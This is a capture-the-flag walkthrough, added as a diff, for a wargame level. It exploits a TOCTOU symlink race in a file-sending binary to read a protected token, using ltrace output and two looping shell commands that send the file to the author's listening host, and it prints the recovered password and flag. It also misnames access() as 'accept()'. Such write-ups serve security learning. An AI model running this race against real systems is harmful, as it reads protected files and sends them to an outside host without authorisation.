@@ -1,0 +1,81 @@
+# At this level we have an executable and a file named 'token'. We have no rights to this file.
+
+$> ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+# This executable allows us to send a file to an ip. So, I will send data to host, to do this I need to listen on port 6969 with a ruby script.
+
+$> ./level10 token <HOST>
+You don't have access to token
+
+$> echo "test" > /tmp/test
+
+IN HOST -> $> ruby listen.rb
+
+IN VM -> $> ./level10 /tmp/test <HOST>
+			Connecting to 192.168.56.101:6969 .. Connected!
+			Sending file .. wrote file!
+
+IN HOST -> .*( )*.
+			test
+
+# Now that I know how this executable works, I must exploit it !
+
+$> ltrace ./level10 /tmp/test <HOST>
+__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
+access("/tmp/test", 4)                                                            = 0
+printf("Connecting to %s:6969 .. ", "192.168.56.101")                             = 37
+fflush(0xb7fd1a20Connecting to 192.168.56.101:6969 .. )                                                                = 0
+socket(2, 1, 0)                                                                   = 3
+inet_addr("192.168.56.101")                                                       = 0x6538a8c0
+htons(6969, 1, 0, 0, 0)                                                           = 14619
+connect(3, 0xbffff70c, 16, 0, 0)                                                  = 0
+write(3, ".*( )*.\n", 8)                                                          = 8
+printf("Connected!\nSending file .. "Connected!
+)                                            = 27
+fflush(0xb7fd1a20Sending file .. )                                                                = 0
+open("/tmp/test", 0, 010)                                                         = 4
+read(4, "test\n", 4096)                                                           = 5
+write(3, "test\n", 5)                                                             = 5
+puts("wrote file!"wrote file!
+)                                                               = 12
++++ exited (status 12) +++
+
+# The fonction used to test rights on the file is "accept()". I wrote "Exploit accept() vulnerabilites" and I became aware of the security flaw named TOCTOU which consists in using symbolic links to distort the rights while accept() checks them.
+# To do this I needed two shell scripts.
+# The first one will run ./level10 /tmp/exploit <HOTE> in an infinite loop.
+# The second will create a file names /tmp/lol, I will have rights to this one. Then it will create an symbolic link between this one and /tmp/exploit. Immediatly after that, it will create a symbolic link between ~/token and /tmp/exploit. And all that, in an infinite loop.
+# The purpose of theses scripts is to trick accept() into believing that is checking '/tmp/lol' permissions instead of '~/token' ones by quickly changing symlinks.
+
+1st script:
+$> while true; do touch /tmp/lol; ln -sf /tmp/lol /tmp/exploit; ln -sf ~/token /tmp/exploit; done
+
+2nd script:
+$> while true; do ./level10 token <HOST>; done
+
+# While these scripts are running, run the ruby script. 
+
+IN HOST:
+
+$> ruby listen.rb
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+
+$> su flag10
+password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+
+$> getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
